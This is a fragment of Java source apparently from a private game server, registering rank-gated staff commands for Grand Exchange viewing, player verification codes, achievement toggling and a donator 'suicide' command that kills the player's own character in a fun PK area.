			public boolean execute(Player player, String input) throws Exception{
				player.getGrandExchangeTracker().openInterface();
				return true;
			}
		});

		submit(new Command("viewge", Rank.DEVELOPER){
			@Override
			public boolean execute(Player player, String input) throws Exception{
				final String targetName = filterInput(input).trim();
				final Player target = World.getPlayerByName(targetName);
				if(target == null){
					player.sendf("Error finding player: %s", targetName);
					return false;
				}
				player.getGrandExchangeTracker().openInterface(target.getGrandExchangeTracker().entries);
				return true;
			}
		});

		submit(new Command("setverifycode", Rank.ADMINISTRATOR){
			public boolean execute(final Player player, final String input) throws Exception {
				final String[] split = filterInput(input).trim().split(",");
				if(split.length != 2){
					player.sendf("::setverifycode target,code (code is trimmed so don't worry about leading and trailing spaces after comma)");
					return false;
				}
				final String targetName = split[0].trim();
				final Player target = World.getPlayerByName(targetName);
				if(target == null){
					player.sendf("Error finding player: %s", targetName);
					return false;
				}
				if(Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)){
					player.sendf("You can't do this on staff members");
					return false;
				}
				final String code = split[1].trim();
				if(code.isEmpty()){
					player.sendf("Code cannot be empty! use ::removeverifycode player_name to remove code");
					return false;
				}
				target.verificationCode = code;
				player.sendf("%s now has a verification code of: %s", target.getName(), code);
				target.sendf("Your verification code is: %s", code);
				target.sendf("Upon login you will need to \"::verify %s\" in order to unlock your account", code);
				return true;
			}
		});

		submit(new Command("getverifycode", Rank.ADMINISTRATOR){
			public boolean execute(final Player player, final String input) throws Exception {
				final String targetName = filterInput(input).trim();
				final Player target = World.getPlayerByName(targetName);
				if(target == null){
					player.sendf("Error finding %s", targetName);
					return false;
				}
				if(Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)){
					player.sendf("You can't do this on staff members");
					return false;
				}
				if(target.verificationCode == null || target.verificationCode.isEmpty()){
					player.sendf("%s does not have a verification code", target.getName());
					return false;
				}
				player.sendf("%s has a verification code of: %s", target.getName(), target.verificationCode);
				return true;
			}
		});

		submit(new Command("removeverifycode", Rank.ADMINISTRATOR){
			@Override
			public boolean execute(final Player player, final String input) throws Exception {
				final String targetName = filterInput(input).trim();
				final Player target = World.getPlayerByName(targetName);
				if(target == null){
					player.sendf("Error finding %s", targetName);
					return false;
				}
				if(Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)){
					player.sendf("You can't do this on staff members");
					return false;
				}
				if(target.verificationCode == null || target.verificationCode.isEmpty()){
					player.sendf("%s does not have a verification code", target.getName());
					return false;
				}
				target.verificationCode = "";
				player.sendf("Removed %s's verification code", target.getName());
				target.sendf("Your verification code has been removed");
				return true;
			}
		});

		submit(new Command("enableach", Rank.DEVELOPER){
			@Override
			public boolean execute(final Player player, final String input) throws Exception {
				if(AchievementTracker.active()){
					player.sendf("Achievements are already active");
					return false;
				}
				AchievementTracker.active(true);
				player.sendf("Achievements are now activated");
				return true;
			}
		});

		submit(new Command("disableach", Rank.DEVELOPER){
			@Override
			public boolean execute(final Player player, final String input) throws Exception {
				if(!AchievementTracker.active()){
					player.sendf("Achievements are already inactive");
					return false;
				}
				AchievementTracker.active(false);
				player.sendf("Achievements are now deactivated");
				return true;
			}
		});

		submit(new Command("suicide", Rank.DONATOR) {
			@Override
			public boolean execute(final Player player, final String input) throws Exception {
				if(!player.getPosition().inFunPk()){
					player.sendf("You can only use the suicide command at funpk!");
					return false;
				}
				player.cE.hit(player.getSkills().getLevel(Skills.HITPOINTS), player, true, Constants.MELEE);
				return true;
			}
		});*/
	}

}
